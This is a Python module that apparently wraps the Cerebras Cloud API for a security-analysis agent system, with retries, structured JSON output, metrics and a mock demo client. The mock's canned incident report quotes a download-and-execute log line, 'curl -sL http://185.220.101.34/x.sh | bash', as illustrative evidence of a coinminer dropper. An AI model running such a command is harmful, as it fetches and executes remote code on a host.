"""
SENTINEL-AI Cerebras Cloud SDK wrapper.

Provides a unified LLM client that:

- Calls the Cerebras Cloud API (``cerebras.cloud.sdk.Cerebras``) for
  inference on the ``gpt-oss-120b`` model.
- Supports structured output via Pydantic ``response_model`` — the model
  is instructed to return JSON matching the schema, which is then parsed
  and validated.
- Tracks performance metrics (prompt/completion tokens, latency,
  tokens-per-second) and publishes ``speed_sample`` messages to the
  message bus.
- Logs every invocation into DuckDB for auditing.
- Falls back to a ``MockCerebrasClient`` when ``CEREBRAS_API_KEY`` is
  empty (demo mode) so the system remains fully functional without a
  real API key.
- Uses ``tenacity`` for automatic retries with exponential backoff.

Usage::

    from sentinel.llm import get_client
    client = get_client()
    result = client.chat([{"role": "user", "content": "Analyse this log..."}])

    # Structured output
    from sentinel.orchestration.message_bus import EvidenceChain
    chain = client.chat(messages, response_model=EvidenceChain)
"""

from __future__ import annotations

import json
import logging
import time
import uuid
from datetime import datetime
from typing import Any, Dict, List, Optional, Type, Union

from pydantic import BaseModel
from tenacity import (
    retry,
    stop_after_attempt,
    wait_exponential,
    retry_if_exception_type,
)

from sentinel import config

logger = logging.getLogger("sentinel.llm")

# ── Lazy imports to avoid circular-import issues ─────────────────────────────


def _get_bus():
    """Lazy import of the global message bus singleton."""
    from sentinel.orchestration.message_bus import bus

    return bus


def _get_AgentMessage():
    """Lazy import of AgentMessage."""
    from sentinel.orchestration.message_bus import AgentMessage

    return AgentMessage


def _log_to_duckdb(
    agent: str,
    prompt_text: str,
    response_text: str,
    prompt_tokens: int,
    completion_tokens: int,
    latency_ms: float,
    tokens_per_sec: float,
) -> None:
    """Lazy import + call to duckdb_store.log_llm_call."""
    try:
        from sentinel.storage import duckdb_store

        duckdb_store.log_llm_call(
            agent=agent,
            prompt_text=prompt_text,
            response_text=response_text,
            prompt_tokens=prompt_tokens,
            completion_tokens=completion_tokens,
            latency_ms=latency_ms,
            tokens_per_sec=tokens_per_sec,
        )
    except Exception as exc:  # noqa: BLE001
        logger.warning("Failed to log LLM call to DuckDB: %s", exc)


# ── JSON extraction helper ───────────────────────────────────────────────────


def _extract_json(text: str) -> str:
    """
    Extract a JSON object from text that may contain markdown fences
    or surrounding prose.
    """
    # Strip markdown code fences
    cleaned = text.strip()
    if cleaned.startswith("```"):
        # Remove opening fence (```json or ```)
        first_newline = cleaned.index("\n") if "\n" in cleaned else len(cleaned)
        cleaned = cleaned[first_newline + 1 :]
        # Remove closing fence
        if cleaned.rstrip().endswith("```"):
            cleaned = cleaned.rstrip()[:-3].rstrip()

    # Try to find JSON object boundaries
    start = cleaned.find("{")
    end = cleaned.rfind("}")
    if start != -1 and end != -1 and end > start:
        return cleaned[start : end + 1]

    return cleaned


# ── Schema instruction builder ───────────────────────────────────────────────


def _build_schema_instruction(model_class: Type[BaseModel]) -> str:
    """Build a system-message addendum instructing the LLM to return JSON
    matching the given Pydantic model's schema."""
    schema = model_class.model_json_schema()
    return (
        "\n\nYou MUST respond with a single JSON object matching this schema. "
        "Do NOT include markdown fences or any other text outside the JSON.\n"
        f"JSON Schema:\n{json.dumps(schema, indent=2)}"
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  REAL CLIENT (Cerebras Cloud SDK)
# ═══════════════════════════════════════════════════════════════════════════════


class CerebrasClient:
    """
    Production LLM client backed by the Cerebras Cloud SDK.

    Wraps ``cerebras.cloud.sdk.Cerebras`` and provides a single ``chat()``
    method with optional structured (Pydantic) output.
    """

    def __init__(self) -> None:
        from cerebras.cloud.sdk import Cerebras  # type: ignore[import-untyped]

        self._client = Cerebras(api_key=config.CEREBRAS_API_KEY)
        self._model = config.CEREBRAS_MODEL
        self._max_tokens = config.CEREBRAS_MAX_TOKENS
        self._temperature = config.CEREBRAS_TEMPERATURE
        self._agent_name = "llm_client"

    @retry(
        stop=stop_after_attempt(3),
        wait=wait_exponential(multiplier=1, min=1, max=10),
        retry=retry_if_exception_type(Exception),
        reraise=True,
    )
    def _call_api(self, messages: List[Dict[str, str]]) -> Any:
        """Low-level API call with tenacity retry wrapper."""
        return self._client.chat.completions.create(
            model=self._model,
            messages=messages,
            max_tokens=self._max_tokens,
            temperature=self._temperature,
        )

    def chat(
        self,
        messages: List[Dict[str, str]],
        response_model: Optional[Type[BaseModel]] = None,
        agent_name: str = "unknown",
    ) -> Union[str, BaseModel]:
        """
        Send a chat completion request to Cerebras.

        Parameters
        ----------
        messages:
            OpenAI-style messages list (role + content dicts).
        response_model:
            If provided, the LLM is instructed to return JSON matching
            this Pydantic model's schema.  The response is parsed and
            validated as an instance of the model.
        agent_name:
            Name of the calling agent (for logging and bus messages).

        Returns
        -------
        str | BaseModel
            Raw text response, or a validated Pydantic object when
            ``response_model`` is given.
        """
        # Inject schema instructions into the system message
        working_messages = list(messages)
        if response_model is not None:
            schema_addendum = _build_schema_instruction(response_model)
            if working_messages and working_messages[0]["role"] == "system":
                working_messages[0] = {
                    "role": "system",
                    "content": working_messages[0]["content"] + schema_addendum,
                }
            else:
                working_messages.insert(
                    0, {"role": "system", "content": schema_addendum}
                )

        # Time the request
        prompt_text = json.dumps(working_messages, default=str)[:4000]
        t0 = time.perf_counter()
        response = self._call_api(working_messages)
        latency_s = time.perf_counter() - t0
        latency_ms = latency_s * 1000.0

        # Extract content and token counts
        raw_text = response.choices[0].message.content or ""
        usage = getattr(response, "usage", None)
        prompt_tokens = getattr(usage, "prompt_tokens", 0) if usage else 0
        completion_tokens = getattr(usage, "completion_tokens", 0) if usage else 0
        total_tokens = prompt_tokens + completion_tokens
        tokens_per_sec = (
            completion_tokens / latency_s if latency_s > 0 else 0.0
        )

        # Publish speed_sample to message bus
        try:
            AgentMessage = _get_AgentMessage()
            _get_bus().publish(
                AgentMessage(
                    from_agent=agent_name,
                    to_agent="broadcast",
                    kind="tool_result",
                    content="speed_sample",
                    payload={
                        "prompt_tokens": prompt_tokens,
                        "completion_tokens": completion_tokens,
                        "total_tokens": total_tokens,
                        "latency_ms": round(latency_ms, 1),
                        "tokens_per_sec": round(tokens_per_sec, 1),
                        "model": self._model,
                    },
                )
            )
        except Exception as exc:  # noqa: BLE001
            logger.warning("Failed to publish speed_sample: %s", exc)

        # Log to DuckDB
        _log_to_duckdb(
            agent=agent_name,
            prompt_text=prompt_text,
            response_text=raw_text[:4000],
            prompt_tokens=prompt_tokens,
            completion_tokens=completion_tokens,
            latency_ms=latency_ms,
            tokens_per_sec=tokens_per_sec,
        )

        # Parse structured output if requested
        if response_model is not None:
            try:
                json_str = _extract_json(raw_text)
                return response_model.model_validate_json(json_str)
            except Exception as exc:
                logger.error(
                    "Failed to parse response as %s: %s\nRaw: %s",
                    response_model.__name__,
                    exc,
                    raw_text[:500],
                )
                raise ValueError(
                    f"LLM returned invalid {response_model.__name__} JSON: {exc}"
                ) from exc

        return raw_text


# ═══════════════════════════════════════════════════════════════════════════════
#  MOCK CLIENT (Demo mode — no API key required)
# ═══════════════════════════════════════════════════════════════════════════════


class MockCerebrasClient:
    """
    Drop-in replacement for ``CerebrasClient`` used in demo mode.

    Returns realistic canned responses so the full pipeline can run
    end-to-end without a real API key.
    """

    _CANNED_EVIDENCE_CHAIN: Dict[str, Any] = {
        "agent": "mock",
        "conclusion": (
            "Suspicious activity detected — potential brute-force login attempt "
            "followed by anomalous process execution.  Multiple failed SSH "
            "authentication events from external IP 45.33.32.156 preceded a "
            "successful login.  Post-authentication, the user spawned an "
            "unusual process chain (curl → bash → /tmp/.x) consistent with "
            "a coinminer dropper."
        ),
        "confidence": 0.82,
        "evidence": [
            {
                "log_id": "evt-demo-001",
                "timestamp": "2025-06-01T14:22:31Z",
                "excerpt": "sshd: Failed password for admin from 45.33.32.156 port 44123 ssh2",
                "why_relevant": "Part of brute-force sequence — 47 failed attempts in 2 minutes",
            },
            {
                "log_id": "evt-demo-002",
                "timestamp": "2025-06-01T14:24:58Z",
                "excerpt": "sshd: Accepted password for admin from 45.33.32.156 port 44199 ssh2",
                "why_relevant": "Successful login after brute-force — attacker gained access",
            },
            {
                "log_id": "evt-demo-003",
                "timestamp": "2025-06-01T14:25:13Z",
                "excerpt": "bash: curl -sL http://185.220.101.34/x.sh | bash",
                "why_relevant": "Download-and-execute pattern typical of coinminer droppers",
            },
        ],
        "mitre_techniques": ["T1110.001", "T1059.004", "T1105", "T1496"],
        "next_actions": [
            "Isolate host prod-web-01 from the network",
            "Reset credentials for user 'admin'",
            "Block IP 45.33.32.156 at the perimeter firewall",
            "Scan /tmp directory for dropped binaries",
            "Check crontab for persistence entries",
        ],
    }

    _CANNED_TEXT: str = (
        "Based on the analysis of the provided security event, this appears "
        "to be a moderate-confidence true positive.  The observed behaviour "
        "matches known attack patterns for credential-based initial access "
        "followed by post-exploitation activity.  I recommend escalating to "
        "the forensics and threat intelligence agents for deeper analysis, "
        "and immediately containing the affected host to prevent lateral "
        "movement."
    )

    def __init__(self) -> None:
        self._model = config.CEREBRAS_MODEL + "-mock"
        self._agent_name = "llm_client_mock"

    def chat(
        self,
        messages: List[Dict[str, str]],
        response_model: Optional[Type[BaseModel]] = None,
        agent_name: str = "unknown",
    ) -> Union[str, BaseModel]:
        """Return canned responses, simulating ~300 ms latency."""
        import time as _time

        prompt_text = json.dumps(messages, default=str)[:4000]
        t0 = _time.perf_counter()
        _time.sleep(0.3)  # Simulate network latency
        latency_s = _time.perf_counter() - t0
        latency_ms = latency_s * 1000.0

        # Build fake token counts
        prompt_tokens = max(50, len(prompt_text) // 4)
        completion_tokens = 350
        tokens_per_sec = completion_tokens / latency_s if latency_s > 0 else 2000.0

        # Determine response
        if response_model is not None:
            # Check if it's EvidenceChain or compatible model
            canned = dict(self._CANNED_EVIDENCE_CHAIN)
            canned["agent"] = agent_name
            raw_text = json.dumps(canned)
            try:
                result = response_model.model_validate_json(raw_text)
            except Exception:
                # Fallback: try to construct with minimal fields
                try:
                    result = response_model.model_validate(canned)
                except Exception:
                    raw_text = self._CANNED_TEXT
                    result = None  # type: ignore[assignment]
        else:
            raw_text = self._CANNED_TEXT
            result = None

        # Publish speed_sample to message bus
        try:
            AgentMessage = _get_AgentMessage()
            _get_bus().publish(
                AgentMessage(
                    from_agent=agent_name,
                    to_agent="broadcast",
                    kind="tool_result",
                    content="speed_sample",
                    payload={
                        "prompt_tokens": prompt_tokens,
                        "completion_tokens": completion_tokens,
                        "total_tokens": prompt_tokens + completion_tokens,
                        "latency_ms": round(latency_ms, 1),
                        "tokens_per_sec": round(tokens_per_sec, 1),
                        "model": self._model,
                        "demo_mode": True,
                    },
                )
            )
        except Exception as exc:  # noqa: BLE001
            logger.warning("Failed to publish mock speed_sample: %s", exc)

        # Log to DuckDB
        _log_to_duckdb(
            agent=agent_name,
            prompt_text=prompt_text,
            response_text=raw_text[:4000],
            prompt_tokens=prompt_tokens,
            completion_tokens=completion_tokens,
            latency_ms=latency_ms,
            tokens_per_sec=tokens_per_sec,
        )

        if response_model is not None and result is not None:
            return result
        return raw_text


# ═══════════════════════════════════════════════════════════════════════════════
#  SINGLETON ACCESSOR
# ═══════════════════════════════════════════════════════════════════════════════

_singleton: Optional[Union[CerebrasClient, MockCerebrasClient]] = None


def get_client() -> Union[CerebrasClient, MockCerebrasClient]:
    """
    Return the singleton LLM client.

    If ``CEREBRAS_API_KEY`` is set (and ``SENTINEL_DEMO_MODE`` is false),
    a real ``CerebrasClient`` is returned.  Otherwise a
    ``MockCerebrasClient`` provides canned responses for demo/testing.
    """
    global _singleton
    if _singleton is None:
        if config.CEREBRAS_API_KEY and not config.SENTINEL_DEMO_MODE:
            logger.info("Initialising CerebrasClient (model=%s)", config.CEREBRAS_MODEL)
            _singleton = CerebrasClient()
        else:
            logger.info(
                "DEMO MODE — using MockCerebrasClient (no API key or demo flag set)"
            )
            _singleton = MockCerebrasClient()
    return _singleton


def reset_client() -> None:
    """
    Reset the singleton so the next ``get_client()`` call creates a
    fresh instance.  Useful for testing.
    """
    global _singleton
    _singleton = None
